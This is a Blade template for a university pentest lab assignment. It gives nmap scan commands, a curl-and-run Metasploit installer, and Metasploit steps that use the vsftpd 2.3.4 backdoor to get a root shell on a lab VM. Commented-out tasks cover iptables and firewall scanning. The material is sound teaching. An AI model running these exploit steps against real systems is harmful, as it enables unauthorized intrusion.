@extends('adminlte::layouts.app')

{{--@section('head_css')--}}
{{--<link rel="stylesheet" href="{{ URL::asset('packages/vis/dist/vis.css') }}" />--}}
{{--@endsection--}}

@section('htmlheader_title')
    Workspace
    {{--{{ trans('message.role') }}--}}
@endsection

@section('contentheader_title')
    CSE468 Workspace
@endsection

@section('contentheader_description')
    Task Detail
@endsection

@section('main-content')
l    <div class="container-fluid spark-screen">
        <div class="row">
            <div id="labcontent" class="col-md-6 resizable">
                <div class="box box-solid">
                    <div class="box-header with-border">
                        {{--<h3 class="box-title">Iptables Firewall Setup</h3>--}}
                        <div class="bs-wizard" style="border-bottom:0;">

                            <div id="bs-wizard-step-100" class="col-xs-3 bs-wizard-step ">
                                <div class="text-center bs-wizard-stepnum">Intro</div>
                                <div class="progress"><div class="progress-bar"></div></div>
                                <a href="#task_100" class="bs-wizard-dot" onclick="active_bar_step(this)" title="Submission 1"></a>
                            </div>


                            <div id="bs-wizard-step-111" class="col-xs-3 bs-wizard-step">
                                <div class="text-center bs-wizard-stepnum">Task 1</div>
                                <div class="progress"><div class="progress-bar"></div></div>
                                <a href="#task_111" class="bs-wizard-dot" onclick="active_bar_step(this)"></a>
                            </div>

                            <div id="bs-wizard-step-112" class="col-xs-3 bs-wizard-step">
                                <div class="text-center bs-wizard-stepnum">Task 2</div>
                                <div class="progress"><div class="progress-bar"></div></div>
                                <a href="#task_112" class="bs-wizard-dot" onclick="active_bar_step(this)"></a>
                            </div>

                            {{--<div id="bs-wizard-step-102" class="col-xs-3 bs-wizard-step">--}}
                                {{--<div class="text-center bs-wizard-stepnum">Task 2</div>--}}
                                {{--<div class="progress"><div class="progress-bar"></div></div>--}}
                                {{--<a href="#task_102" class="bs-wizard-dot" onclick="active_bar_step(this)"></a>--}}
                            {{--</div>--}}

                            {{--<div id="bs-wizard-step-103" class="col-xs-3 bs-wizard-step">--}}
                                {{--<div class="text-center bs-wizard-stepnum">Task 3</div>--}}
                                {{--<div class="progress"><div class="progress-bar"></div></div>--}}
                                {{--<a href="#task_103" class="bs-wizard-dot" onclick="active_bar_step(this)"></a>--}}
                            {{--</div>--}}


                        </div>
                        <button style="float: right" onclick="close_content();">Close</button>
                    </div>
                    <!-- /.box-header -->

                    <!-- we are adding the .panel class so bootstrap.js collapse plugin detects it -->

                    <div class="box-body" >

                    <div id="taskbox" class="box-body" style="height: 300px; overflow-y: auto">
                        <div id="task_100">
                            <h2 class="box-title">Intro:</h2>
                            <p><p><b>Category:</b></p>

                            <p>Computer Networking</p>

                            <p><b>Objects</b>: </p>

                            <p>1. &nbsp; &nbsp;Group-based project experience</p>

                            <p>2. &nbsp; &nbsp;Pentest procedures and regulations</p>

                            <p>3.	Pentest deployment and management</p>

                            <p>4. &nbsp; &nbsp;Vulnerabilities exploration</p>

                            <p>5. &nbsp; &nbsp;Documentation and reporting.</p>



                            <p><b>Estimated Time</b>: </p>

                            <p> &nbsp; &nbsp; &nbsp; &nbsp;
                                Expert:
                                240 minutes</p>

                            <p> &nbsp; &nbsp; &nbsp; &nbsp;
                                Novice:
                                720 minutes</p>

                            <p><b>Required OS</b>: </p>
                            <p>Ubuntu</p>
                            <p><b>Lab Environment</b>: </p>
                            <img src="/img/lab5fig1.png" style="width: 450px;">
                            <p>In this project, a three-member group team is formed. Each group member has his/her pentest VM to deploy their pentest tasks. As show in the figure above, the net2-net4 are private networks (please check you ThoTh Lab setup about the network configuration for each private network). Net 1 is the public network 10.8.10.0/24. Four VMs IPs are:
                                <br/>VM1: 10.8.10.57
                                <br/>VM2: 10.8.10.168
                                <br/>VM2: 10.8.10.175
                                <br/>VM3: 10.8.10.177
                            </p>
                            <p><b>Preparations</b>: </p>
                            <p>1. &nbsp; &nbsp;  ThoTh Lab is used to run
                                the project.  </p>
                            <p>2. &nbsp; &nbsp;  You only need to use your own pentest VM, i.e., the GW VM in your previous project.</p>

                            <p>Gateway need access to Internet and scan all ports on several target. Please check your gateway firewall setup (e.g., iptables) to make sure it can access to the public Internet. </p>
                            <P>There are three four target machine now: 10.8.10.57,,10.8.10.168, 10.8.10.175 and 10.8.10.177</P>

                            &nbsp; &nbsp; &nbsp; &nbsp;
                            {{--<div class="text-center">--}}
                                {{--<button type="button" class="btn btn-default btn-info" data-toggle="modal" data-target="#quiz-0" id="startquiz"><i class="fa fa-file-text"></i> Take Pre-Lab Survey</button>--}}
                                {{--<button type="button" class="btn btn-default btn-warning" data-toggle="modal" data-target="#quiz-4" id="startquiz"><i class="fa fa-warning"></i>Take Pre-Lab Quiz</button>--}}
                            {{--</div>--}}
                        </div>

                        <div id="task_110">
                            <h3 class="box-title">Project Overall Requirements:</h3>
                            <ol>
                                <li>Identify a business for your team to work with and assume that you are a pentesting team to provide the security services to the business. Follow the instructions provided in the project report template <button onclick="location.href='/img/pentestreporttemp.docx'" type="button">Download here</button> to describe your business-related issues, constraints, and considerations (please check the section IX of the project report template). </li>
                                <li>In your pentest task assignment, you need to identify which group member is responsible for testing which vulnerable VM. Note that in the group project, the group member should only perform the testing in his/her own working VM (i.e., the GW vm), and the screenshots you taken will have you user's ID associated with. Use the screenshots as evidence to show the individual's work. Please describe the responsibility for each group member in the Section IV.A of the reporting template. </li>
                                <li>Complete each section of the project report and following the highlighted instruction given in the report template. </li>
                                <li>Creating a 3 minutes Youtube video clip to present your project. Considering you are providing the report presentation to the c-level of the business that your team providing the security service. </li>
                                <li>In the following tasks, the task 1 is a step-by-step example for a pentest, any of your group member can finish.</li>
                                <li>In the following tasks, the task 2 is given for each group member. Note that you can only edit/delete your own screenshot and you can view your team members' screenshot but cannot edit and delete. The task 2 is to explore vulnerabilities for reporting. If you can use Metasploit to compromise the system, then you will get extra credit.</li>
                                <li>For every member, please use the log template <button onclick="location.href='/img/pentestlogtemp.docx'" type="button">Download here</button>to document each step when you explore the system. Each member needs to submit their own log file. </li>
                                <li>Please use the presentation template <button onclick="location.href='/img/pentestpresentation.pptx'" type="button">Download here</button> to create your short presentation and submit it.</li>
                            </ol>
                        </div>

                        <div id="task_111">
                            <h3 class="box-title">Task 1: Pentest and Metasploit Exercise</h3>

                            <ol style="list-style-type: none;">
                                <li>1.1 Install NMAP on Gateway</li>

                                <li>1.2 Scan all services on target 10.8.10.57 using NMAP from your Gateway.</li>
                                <ol style="list-style-type: lower-alpha;">

                                    <li>Scan by issuing the following command:</li>
                                    <em>nmap -sS -Pn -A 10.8.10.57</em>
                                    <li>This will scan all ports that's open on 10.8.10.57 and also check verison number of these services.
                                </ol>
                                <li>1.3 Install Metasploit</li>
                                You need to run the following command:
                                <ol style="list-style-type: lower-alpha;">
                                    <li><em>sudo apt-get update</em></li>
                                    <li><em>sudo apt-get install curl</em></li>
                                    <li><em>curl https://raw.githubusercontent.com/rapid7/metasploit-omnibus/master/config/templates/metasploit-framework-wrappers/msfupdate.erb > msfinstall </em></li>
                                    <li><em>chmod 755 msfinstall && ./msfinstall</em></li>
                                    <li>After installation, you may run Metasploit framewark by <em>sudo msfconsole</em></li>
                                </ol>
                                <li>1.4 Initial Attack from your Gateway to 10.8.10.57 using Metasploit</li>
                                From the scan result of NMAP, you should noticed that port 21 is open on 10.8.10.57, and the vsftpd runing on it is version 2.3.4.
                                A quick search of vsftpd 2.3.4 online will lead us to a vulnerability.
                                (https://www.rapid7.com/db/modules/exploit/unix/ftp/vsftpd_234_backdoor)
                                Using Metasploit to attack this vulnerability:
                                <ol style="list-style-type: lower-alpha;">
                                    <li><em>sudo msfconsole</em></li>
                                    <li><em>use exploit/unix/ftp/vsftpd_234_backdoor</em></li>
                                    <li><em>set RHOST 10.8.10.57</em></li>
                                    <li><em>exploit</em></li>
                                    <li>Wait a while and Metasploit will open a root shell between your Gateway way and 10.8.10.57, please create a new text file under 10.8.10.57's /root folder.  Please use your email as the name of the file (using vim or nano).</li>
                                    <li>Please make sure you close the connection by <em>exit</em> command, then use <em>exit -y</em> to exit msfconsole. Otherwise, other student can not init their attack!</li>

                                </ol>

                            </ol>


                            <button type="button" class="btn btn-default btn-info btn-task-111"  id="startsubmission_111" onclick="groupopensubmission(111,'{!! $userid !!}','{!! $subgroupid !!}')"><i class="fa fa-plus"></i> Task 1 Submission</button><span class="label label-warning" style="font-size:100%" id="countdownall">You've got <span id="countdown"></span> left!</span><br/><b style="color: red;">Task 1 Due on Dec 2rd, 2018 23:59:59 AZ Time!</b>

                            <div id='submission_111' class="modal-body" style="display: none">
                                <form>

                                    1.2 Take screenshot(s) of your NMAP scan result.(Must include port 21 result)<br>
                                    <button id='sub_111_1' type="button" class="btn btn-default btn-add-screenshot btn-task-111" onclick="grouptakescreenshot(111,615,1,'Server','{!! $subgroupid !!}')"><i class="fa fa-plus"></i>Add Screenshot and Explanation</button><br>
                                    <div id="submission-task111-1" style="border: 1px solid lightblue;min-height: 45px; vertical-align: middle"></div>
                                    1.3 After install Metasploit, take a screenshot of <em>sudo msfconsole</em> result<br>
                                    <button id='sub_111_2' type="button" class="btn btn-default btn-add-screenshot btn-task-111" onclick="grouptakescreenshot(111,615,2,'Server','{!! $subgroupid !!}')"><i class="fa fa-plus"></i>Add Screenshot and Explanation</button><br>
                                    <div id="submission-task111-2" style="border: 1px solid lightblue;min-height: 45px; vertical-align: middle"></div>
                                    1.4.d Take screenshot(s) of <em>exploit</em> output<br>
                                    <button id='sub_111_3' type="button" class="btn btn-default btn-add-screenshot btn-task-111" onclick="grouptakescreenshot(111,615,3,'Server','{!! $subgroupid !!}')"><i class="fa fa-plus"></i>Add Screenshot and Explanation</button><br>
                                    <div id="submission-task111-3" style="border: 1px solid lightblue;min-height: 45px; vertical-align: middle"></div>
                                    1.4.e Take screenshot(s) of the file you added.<br>
                                    <button id='sub_111_4' type="button" class="btn btn-default btn-add-screenshot btn-task-111" onclick="grouptakescreenshot(111,615,4,'Server','{!! $subgroupid !!}')"><i class="fa fa-plus"></i>Add Screenshot and Explanation</button><br>
                                    <div id="submission-task111-4" style="border: 1px solid lightblue;min-height: 45px; vertical-align: middle"></div>
                                    {{--<button type="button" data-toggle="modal" data-target="#survey-0" id="startsurvey-110" class="btn btn-default btn-info" ><i class="fa fa-file-text"></i> Take Post-Lab Survey</button>--}}
                                    <button id="finaltask" type="button" class="btn btn-default btn-success pull-right  btn-task-111" onclick="finish_task(111)" ><i class="fa fa-share"></i>Complete Task 1</button>
                                    <button id="viewreport" type="button" class="btn btn-default pull-right  btn-task-111" onclick="view_groupreport(111,'{!! $subgroupid !!}')"><i class="fa fa-eye"></i>Pre-view Report</button>



                                </form>
                            </div>
                            <br/>

                        </div>
                        <div id="task_112">
                            <h3 class="box-title">Task 2: Explore vulnerabilities on other VMs</h3>
                            In task 1, you explore the vulnerability on the VM 10.8.10.57. In this task, each group member needs to following the similar procedure given in the task 1 to do a pentest on your assigned VM (each student pick one target from 10.8.10.168, 10.8.10.175 and 10.8.10.177). Instead of using nmap, you may use Nessus to scan your VM (please check it out on Nessus website on how to install and use Nessus) and identify vulnerabilities to draft your report. Unless the system issues from ThoTh Lab, TA and the Instructor of this course will not offer any technical assistance on pentesting related issues. In this task:

                            <ol style="list-style-type: none;">
                                <li>2.1	You should deploy the pentest by yourself and you may consult your group members for help.</li>



                                <li>2.2 Document each of your steps using the log template and use screenshots to show the evidence of your work. </li>

                                <li>2.3	The baseline of this task is to identify vulnerabilities and create report based on your discoveries. If you can further find a solution using Metasploit or other tools you like to compromise the system, then you will get bonus points. The more vulnerabilities that you had successfully explored and compromised, the more bonus points that you will get. </li>


                            </ol>


                            <button type="button" class="btn btn-default btn-info btn-task-112"  id="startsubmission_112" onclick="groupopensubmission(112,'{!! $userid !!}','{!! $subgroupid !!}')"><i class="fa fa-plus"></i> Task 2 Submission</button><span class="label label-warning" style="font-size:100%" id="countdownall2">You've got <span id="countdown2"></span> left!</span><br/><b style="color: red;">Task 2 Due on Dec 2rd, 2018 23:59:59 AZ Time!</b>

                            <div id='submission_112' class="modal-body" style="display: none">
                                <form>

                                    2.1 Take screenshot(s) of your pentest result (you still need to include these into your report and log file).<br>
                                    <button id='sub_112_1' type="button" class="btn btn-default btn-add-screenshot btn-task-112" onclick="grouptakescreenshot(112,615,1,'Server','{!! $subgroupid !!}')"><i class="fa fa-plus"></i>Add Screenshot and Explanation</button><br>
                                    <div id="submission-task112-1" style="border: 1px solid lightblue;min-height: 45px; vertical-align: middle"></div>
                                    2.2 Upload your log file, presentation file and report (each student need to upload your own files.)<br>
                                    <button id='sub_112_2' type="button" class="btn btn-default btn-add-screenshot btn-task-112" onclick="groupaddfile(112,615,2,'{!! $subgroupid !!}')"><i class="fa fa-plus"></i>Upload File</button><br>
                                    <div id="submission-task112-2" style="border: 1px solid lightblue;min-height: 45px; vertical-align: middle"></div>
                                    2.3. Take screenshot(s) showing how you compromised the target system (you still need to include these into your report and log file).<br>
                                    <button id='sub_112_3' type="button" class="btn btn-default btn-add-screenshot btn-task-112" onclick="grouptakescreenshot(112,615,3,'Server','{!! $subgroupid !!}')"><i class="fa fa-plus"></i>Add Screenshot and Explanation</button><br>
                                    <div id="submission-task112-3" style="border: 1px solid lightblue;min-height: 45px; vertical-align: middle"></div>


                                    <button type="button" data-toggle="modal" data-target="#survey-0" id="startsurvey-110" class="btn btn-default btn-info" ><i class="fa fa-file-text"></i> Take Post-Lab Survey</button>
                                    <button id="finaltask" type="button" class="btn btn-default btn-success pull-right  btn-task-112" onclick="finish_task(112)" title="Please finish Survey First!" disabled><i class="fa fa-share"></i>Complete Task 2</button>
                                    <button id="viewreport" type="button" class="btn btn-default pull-right  btn-task-112" onclick="view_groupreport(112,'{!! $subgroupid !!}')"><i class="fa fa-eye"></i>Pre-view Report</button>



                                </form>
                            </div>
                            <br/>

                        </div>
                        <br />
                        {{--<div id="task_102">--}}
                            {{--<h3 class="box-title">Task 2: Iptables Firewall Setup</h3>--}}

                            {{--<p>On the gateway specify the following packet filtering policies. For each requirement, please provide both configuration setup and demos to show the configuration is successful.</p>--}}
                            {{--<ol style="list-style-type: none;">--}}
                                {{--<li>2.1 Set the default iptables policies to DROP for INPUT, OUPUT, and FORWARD chains, which means whitelist policy: only allowing required traffic policies and disable all other traffic.</li>--}}
                                {{--<li>2.2 Consider the server-side network is a private and protected network, configure NAT service properly on the gateway to change source and destination IP addresses form/to the server-side network in the following requirements.</li>--}}
                                {{--<li>2.3 Allow the client to send DNS request to the server for the following URLs, and they all match with the server&rsquo;s IP address. Note that, due to the NAT, the client will not know the server&rsquo;s IP, but the gateway&rsquo;s IP on the client network. Required URLs are:--}}
                                    {{--<ul>--}}
                                        {{--<li>asu-securitylab.com</li>--}}
                                        {{--<li>www.asu-securitylab.com (this is the default web link of the Apache)</li>--}}
                                        {{--<li>ftp.asu-securitylab.com</li>--}}
                                        {{--<li>ssh.asu-securitylab.com</li>--}}
                                        {{--<li>www (a short alias for www.asu-securitylab.com)</li>--}}
                                        {{--<li>ftp (a short alias for ftp.asu-securitylab.com)</li>--}}
                                        {{--<li>ssh (a short alias for ssh.asu-securitylab.com)</li>--}}
                                        {{--<li>demo.asu-securitylab.com (create a demo virtual host on Apache)</li>--}}
                                    {{--</ul>--}}

                                    {{--<p>(Hint: URLs 1-8 should resolve to the same IP address. Please take nslookup screenshots of any three of URLs on the client.)&nbsp;</p>--}}

                                {{--<li>2.4 Allow the client to access the web page (http) on the server (please create two different pages on the following URLs).--}}
                                    {{--<ul>--}}
                                        {{--<li>www.asu-securitylab.com</li>--}}
                                        {{--<li>demo.asu-securitylab.com</li>--}}
                                        {{--<li>(Challenging Question - Bonus Question) What if you want to open these two URLs from the server-side network? For example, when you browse the URLs in the browser on the server? If it does not work, can you change iptables rules to make it work? Why or why not? If it does not work, what is the most effective solution to address this issue considering that you have a large numbers of hosts on the server-side network and they can also access to the web server? Please describe your solution and if you make configuration changes, please take screenshots and explain your solution.</li>--}}
                                    {{--</ul>--}}
                                {{--</li>--}}
                                {{--<li>2.5 Allow the client to access the ftp in the passive mode (use <em>ftp -p</em> option to start the ftp in passive mode) to access to the server (please set up the passive data ports opening from the server in the range of [30000,30099]).--}}
                                    {{--<ul>--}}
                                        {{--<li>Create a demo downloading file on the server</li>--}}
                                        {{--<li>Show how to access the ftp service from the client and download the demo file successfully</li>--}}
                                        {{--<li>Note that you can use either anonymous or normal mode for file transfer.</li>--}}
                                    {{--</ul>--}}
                                {{--</li>--}}
                                {{--<li>2.6 Allow the server to ping the client&rsquo;s IP address and gateway&rsquo;s IP addresses.</li>--}}
                            {{--</ol>--}}

                            {{--<p>Note that</p>--}}
                            {{--<ol>--}}
                                {{--<li>You should adjust the configurations of bind9, apache2, ssh, and vsftp according to requirements provided by this task.</li>--}}
                                {{--<li>You can enable the gateway to allow client/server for downloading applications from Internet. Once downloading files is finished, you must disable all types of traffic between client/server and the Internet.</li>--}}
                            {{--</ol>--}}


                            {{--<button type="button" class="btn btn-default btn-info btn-task-102"  id="startsubmission_102" onclick="opensubmission(102)"><i class="fa fa-plus"></i> Task 2 Submission</button><span class="label label-warning" style="font-size:100%" id="countdownall2">You've got <span id="countdown2"></span> left!</span><br/><b style="color: red;">Task 2 Due on Oct 13th, 2018 17:59:59 AZ Time!</b>--}}

                            {{--<div id='submission_102' class="modal-body" style="display: none">--}}
                                {{--<form>--}}
                                    {{--2.1 Take screenshot(s) of your iptable rules on your Gateway, explain what rules you've added to drop all traffic in all chain by default.<br>--}}
                                    {{--<button id='sub_102_1' type="button" class="btn btn-default btn-add-screenshot btn-task-102" onclick="takescreenshot(102,613,1,'Server')"><i class="fa fa-plus"></i>Add Screenshot and Explanation</button><br>--}}
                                    {{--<div id="submission-task102-1" style="border: 1px solid lightblue;min-height: 45px; vertical-align: middle"></div>--}}
                                    {{--2.2 None submission.<br/>--}}
                                    {{--2.3a Take screenshot(s) of your iptable rules on your Gateway, explain what rules you've added to allow DNS traffic from Client to Server <br>--}}
                                    {{--<button id='sub_102_2' type="button" class="btn btn-default btn-add-screenshot btn-task-102" onclick="takescreenshot(102,613,2,'Server')"><i class="fa fa-plus"></i>Add Screenshot and Explanation</button><br>--}}
                                    {{--<div id="submission-task102-2" style="border: 1px solid lightblue;min-height: 45px; vertical-align: middle"></div>--}}
                                    {{--2.3b Take screenshot(s) of nslookup result of any three URLs in the list on the Client.  <br>--}}
                                    {{--<button id='sub_102_3' type="button" class="btn btn-default btn-add-screenshot btn-task-102" onclick="takescreenshot(102,613,3,'Server')"><i class="fa fa-plus"></i>Add Screenshot and Explanation</button><br>--}}
                                    {{--<div id="submission-task102-3" style="border: 1px solid lightblue;min-height: 45px; vertical-align: middle"></div>--}}
                                    {{--2.4a Take screenshot(s) of your iptable rules on your Gateway, explain what rules you've added to allow Client to access the web page (http) on Server <br>--}}
                                    {{--<button id='sub_102_4' type="button" class="btn btn-default btn-add-screenshot btn-task-102" onclick="takescreenshot(102,613,4,'Server')"><i class="fa fa-plus"></i>Add Screenshot and Explanation</button><br>--}}
                                    {{--<div id="submission-task102-4" style="border: 1px solid lightblue;min-height: 45px; vertical-align: middle"></div>--}}
                                    {{--2.4b Take screenshot(s) on your Client to show that you can access those two webpages on Server.<br>--}}
                                    {{--<button id='sub_102_5' type="button" class="btn btn-default btn-add-screenshot btn-task-102" onclick="takescreenshot(102,613,5,'Server')"><i class="fa fa-plus"></i>Add Screenshot and Explanation</button><br>--}}
                                    {{--<div id="submission-task102-5" style="border: 1px solid lightblue;min-height: 45px; vertical-align: middle"></div>--}}
                                    {{--2.4c (Challenging Question - Bonus Question) What if you want to open these two URLs from the server-side network? For example, when you browse the URLs in the browser on the server? If it does not work, can you change iptables rules to make it work? Why or why not? If it does not work, what is the most effective solution to address this issue considering that you have a large numbers of hosts on the server-side network and they can also access to the web server? Please describe your solution and if you make configuration changes, please take screenshots and explain your solution.<br>--}}
                                    {{--<button id='sub_102_6' type="button" class="btn btn-default btn-add-screenshot btn-task-102" onclick="takescreenshot(102,613,6,'Server')"><i class="fa fa-plus"></i>Add Screenshot and Explanation</button><br>--}}
                                    {{--<div id="submission-task102-6" style="border: 1px solid lightblue;min-height: 45px; vertical-align: middle"></div>--}}
                                    {{--2.5a Take screenshot(s) of your iptable rules on your Gateway, explain what rules you've added to allow Client to access the ftp server on Server <br>--}}
                                    {{--<button id='sub_102_7' type="button" class="btn btn-default btn-add-screenshot btn-task-102" onclick="takescreenshot(102,613,7,'Server')"><i class="fa fa-plus"></i>Add Screenshot and Explanation</button><br>--}}
                                    {{--<div id="submission-task102-7" style="border: 1px solid lightblue;min-height: 45px; vertical-align: middle"></div>--}}
                                    {{--2.5b Take screenshot(s) on your Client to show that how to access the ftp service from the client and download the demo file successfully.<br>--}}
                                    {{--<button id='sub_102_8' type="button" class="btn btn-default btn-add-screenshot btn-task-102" onclick="takescreenshot(102,613,8,'Server')"><i class="fa fa-plus"></i>Add Screenshot and Explanation</button><br>--}}
                                    {{--<div id="submission-task102-8" style="border: 1px solid lightblue;min-height: 45px; vertical-align: middle"></div>--}}
                                    {{--2.6 Take screenshot(s) of your iptable rules on your Gateway, explain what rules you've added to allow Server to ping Client and GW.<br>--}}
                                    {{--<button id='sub_102_9' type="button" class="btn btn-default btn-add-screenshot btn-task-102" onclick="takescreenshot(102,613,9,'Server')"><i class="fa fa-plus"></i>Add Screenshot and Explanation</button><br>--}}
                                    {{--<div id="submission-task102-9" style="border: 1px solid lightblue;min-height: 45px; vertical-align: middle"></div>--}}
                                    {{--<button id="finaltask" type="button" class="btn btn-default btn-success pull-right  btn-task-102" onclick="finish_task(102)"><i class="fa fa-share"></i>Complete Task 2</button>--}}
                                    {{--<button id="viewreport" type="button" class="btn btn-default pull-right  btn-task-102" onclick="view_report(102)"><i class="fa fa-eye"></i>Pre-view Report</button>--}}




                                {{--</form>--}}
                            {{--</div>--}}

                        {{--</div>--}}
                        {{--<br/>--}}
                        {{--<div id="task_103">--}}
                            {{--<h3 class="box-title">Task 3: Firewall Testing</h3>--}}

                            {{--<p>Firewall plays a central role in network protection and in many cases building a critical line of defense against attackers. Systematic firewall testing is a critical task to ensure strong network security. In general, there are three general approaches for firewall testing:</p>--}}
                            {{--<ol>--}}
                                {{--<li>penetration testing,</li>--}}
                                {{--<li>testing of the firewall implementation, and</li>--}}
                                {{--<li>testing of the firewall rules</li>--}}
                            {{--</ol>--}}
                            {{--<p>In this task, our focus is &ldquo;Testing of the firewall rules&rdquo;, in which testing of the firewall rules is to verify whether the security policy is correctly implemented by a set of firewall rules, and check what ports can be accessed through the firewall.&nbsp;</p>--}}

                            {{--<p>In this task, the security policy is the set of firewall setup requirements in the previous task (task 2). You need to develop an automatic tool by using script or program languages, e.g., perl, python, awk, java, etc., or you choose, to run nmap and/or hping3 in a batch fashion, i.e., automate a set of scanning styles and options to verify your firewall rule setup according the requirement from the task 2.</p>--}}

                            {{--<p>You can perform the testing on the client and the server VMs given in the system to run the script to test your firewall setup. During the testing, considering this is a whitebox testing of iptables firewall, in which you will know the details of the firewall implementation and applied filtering rules.</p>--}}
                            {{--<p>For the testing report, you need to:</p>--}}
                            {{--<ol style="list-style-type: none;">--}}
                                {{--<li>3.1. Issue your testing commands through the script/program that you built for this project. Your script development goal is to minimize the manual inputs and overhead to issue the scanning request with the least number of commands as possible and with shortest scanning time period to test your firewall and validate the policies.</li>--}}
                                {{--<li>3.2. Program your developed tools to satisfy the following requirements:</li>--}}
                            {{--</ol>--}}
                            {{--<table style="width: 570px;" border="1">--}}
                                {{--<thead>--}}
                                {{--<tr>--}}
                                    {{--<td style="width: 550px;" colspan="3">--}}
                                        {{--<p>Nmap/hping3 Programming Requirements:</p>--}}
                                    {{--</td>--}}
                                {{--</tr>--}}
                                {{--<tr>--}}
                                    {{--<td style="width: 233px;">--}}
                                        {{--<p>Type</p>--}}
                                    {{--</td>--}}
                                    {{--<td style="width: 137px;">--}}
                                        {{--<p>Exp., nmap command/options</p>--}}
                                    {{--</td>--}}
                                    {{--<td style="width: 179px;">--}}
                                        {{--<p>Description</p>--}}
                                    {{--</td>--}}
                                {{--</tr>--}}
                                {{--</thead>--}}
                                {{--<tbody>--}}
                                {{--<tr>--}}
                                    {{--<td style="width: 233px;" rowspan="4">--}}
                                        {{--<p>1. Scanning the firewall with four different types (executed one-by-one)</p>--}}
                                    {{--</td>--}}
                                    {{--<td style="width: 137px;">--}}
                                        {{--<p>-sS</p>--}}
                                    {{--</td>--}}
                                    {{--<td style="width: 179px;">--}}
                                        {{--<p>TCP SYN Scan</p>--}}
                                    {{--</td>--}}
                                {{--</tr>--}}
                                {{--<tr>--}}
                                    {{--<td style="width: 137px;">--}}
                                        {{--<p>-sF</p>--}}
                                    {{--</td>--}}
                                    {{--<td style="width: 179px;">--}}
                                        {{--<p>FIN Scan</p>--}}
                                    {{--</td>--}}
                                {{--</tr>--}}
                                {{--<tr>--}}
                                    {{--<td style="width: 137px;">--}}
                                        {{--<p>-sA</p>--}}
                                    {{--</td>--}}
                                    {{--<td style="width: 179px;">--}}
                                        {{--<p>ACK Scan</p>--}}
                                    {{--</td>--}}
                                {{--</tr>--}}
                                {{--<tr>--}}
                                    {{--<td style="width: 137px;">--}}
                                        {{--<p>-sP</p>--}}
                                    {{--</td>--}}
                                    {{--<td style="width: 179px;">--}}
                                        {{--<p>Ping sweep</p>--}}
                                    {{--</td>--}}
                                {{--</tr>--}}
                                {{--<tr>--}}
                                    {{--<td style="width: 233px;" rowspan="2">--}}
                                        {{--<p>2. For each type, perform a port scanning for both TCP and UDP protocol in the range from 10 to 40000</p>--}}
                                    {{--</td>--}}
                                    {{--<td style="width: 137px;">--}}
                                        {{--<p>-p</p>--}}
                                    {{--</td>--}}
                                    {{--<td style="width: 179px;">--}}
                                        {{--<p>Scan for TCP ports</p>--}}
                                    {{--</td>--}}
                                {{--</tr>--}}
                                {{--<tr>--}}
                                    {{--<td style="width: 137px;">--}}
                                        {{--<p>-sU</p>--}}
                                    {{--</td>--}}
                                    {{--<td style="width: 179px;">--}}
                                        {{--<p>Scan for UDP ports</p>--}}
                                    {{--</td>--}}
                                {{--</tr>--}}
                                {{--<tr>--}}
                                    {{--<td style="width: 233px;" rowspan="2">--}}
                                        {{--<p>3. Perform an OS scan using two options</p>--}}
                                    {{--</td>--}}
                                    {{--<td style="width: 137px;">--}}
                                        {{--<p>-O</p>--}}
                                    {{--</td>--}}
                                    {{--<td style="width: 179px;">--}}
                                        {{--<p>Detect operating system</p>--}}
                                    {{--</td>--}}
                                {{--</tr>--}}
                                {{--<tr>--}}
                                    {{--<td style="width: 137px;">--}}
                                        {{--<p>-sV</p>--}}
                                    {{--</td>--}}
                                    {{--<td style="width: 179px;">--}}
                                        {{--<p>Version detection</p>--}}
                                    {{--</td>--}}
                                {{--</tr>--}}
                                {{--</tbody>--}}
                            {{--</table>--}}
                            {{--<ol start="3" style="list-style-type: none;">--}}
                                {{--<li>3.3. Provide screenshots to illustrate your scanning results for each type/option and provide output to show the evidence that you firewall was established properly based on the rule setup requirements from Task 2. If your results demonstrate unnecessary open ports/services, then you will get point deductions.</li>--}}
                                {{--<li>3.4. Submit your script/program as a file with good marked comments/illustrations in the script/program to explain function modules. (Note that do not use existing library to hide details on how to deploy each scanning type and options. There are many existing scripts such as python, NSE that hide the details on how to deploy the scanning actions.)</li>--}}
                                {{--<li>3.5. Submit a readme.txt file to illustrate required running environment and how to use the script.</li>--}}
                            {{--</ol>--}}


                            {{--<button type="button" class="btn btn-default btn-info btn-task-103"  id="startsubmission_103" onclick="opensubmission(103)"><i class="fa fa-plus"></i> Task 3 Submission</button><span class="label label-warning" style="font-size:100%" id="countdownall3">You've got <span id="countdown3"></span> left!</span><br/><b style="color: red;">Task 3 Due on Oct 26th, 2018 23:59:59 AZ Time!</b>--}}

                            {{--<div id='submission_103' class="modal-body" style="display: none">--}}
                                {{--<form>--}}
                                    {{--3.1 None submission.<br/>--}}
                                    {{--3.2 None submission.<br/>--}}
                                    {{--3.3. Provide screenshots to illustrate your scanning results for each type/option and provide output to show the evidence that you firewall was established properly based on the rule setup requirements from Task 2. If your results demonstrate unnecessary open ports/services, then you will get point deductions.<br>--}}
                                    {{--<button id='sub_103_1' type="button" class="btn btn-default btn-add-screenshot btn-task-103" onclick="takescreenshot(103,613,1,'Server')"><i class="fa fa-plus"></i>Add Screenshot and Explanation</button><br>--}}
                                    {{--<div id="submission-task103-1" style="border: 1px solid lightblue;min-height: 45px; vertical-align: middle"></div>--}}
                                    {{--3.4. Submit your script/program as a file with good marked comments/illustrations in the script/program to explain function modules.<br>--}}
                                    {{--<button id='sub_103_2' type="button" class="btn btn-default btn-add-screenshot btn-task-103" onclick="addfile(103,613,2)"><i class="fa fa-plus"></i>Upload File</button><br>--}}
                                    {{--<div id="submission-task103-2" style="border: 1px solid lightblue;min-height: 45px; vertical-align: middle"></div>--}}
                                    {{--3.5. Submit a readme.txt file to illustrate required running environment and how to use the script.<br>--}}
                                    {{--<button id='sub_103_3' type="button" class="btn btn-default btn-add-screenshot btn-task-103" onclick="addfile(103,613,3)"><i class="fa fa-plus"></i>Upload File</button><br>--}}
                                    {{--<div id="submission-task103-3" style="border: 1px solid lightblue;min-height: 45px; vertical-align: middle"></div>--}}


                                    {{--<button id="finaltask" type="button" class="btn btn-default btn-success pull-right  btn-task-103" onclick="finish_task(103)"><i class="fa fa-share"></i>Complete Task 3</button>--}}
                                    {{--<button id="viewreport" type="button" class="btn btn-default pull-right  btn-task-103" onclick="view_report(103)"><i class="fa fa-eye"></i>Pre-view Report</button>--}}




                                {{--</form>--}}
                            {{--</div>--}}
                            {{--<br/>--}}

                        {{--</div>--}}
                        <br/>




                    </div>
                    <!-- /.box-body -->
                    </div>
                </div>

            </div>
            <div id="labenv" class="col-md-6 resizable">
                <div class="box box-solid" id="lab-environment">
                    <div class="box-header with-border">
